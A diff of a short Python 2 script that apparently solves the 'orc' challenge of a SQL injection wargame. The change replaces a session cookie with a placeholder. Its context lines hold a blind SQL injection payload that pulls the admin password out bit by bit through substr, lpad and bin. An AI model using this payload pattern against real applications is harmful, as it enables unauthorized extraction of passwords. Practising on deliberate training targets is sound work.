@@ -5,7 +5,7 @@ import httplib, urllib
 conn = httplib.HTTPConnection('los.eagle-jump.org')
 headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
-    'Cookie': 'PHPSESSID=vn91f0s9lpasn8u4sj99efmp95;'
+    'Cookie': 'PHPSESSID=**session**;'
 }
 payload = (lambda n, m: "'||id=0x61646d696e&&substr(lpad(bin(ascii(substr(pw,%d,1))),7,0),%d,1)=1#"%(n,m))
 url = '/orc_47190a4d33f675a601f8def32df2583a.php?pw='
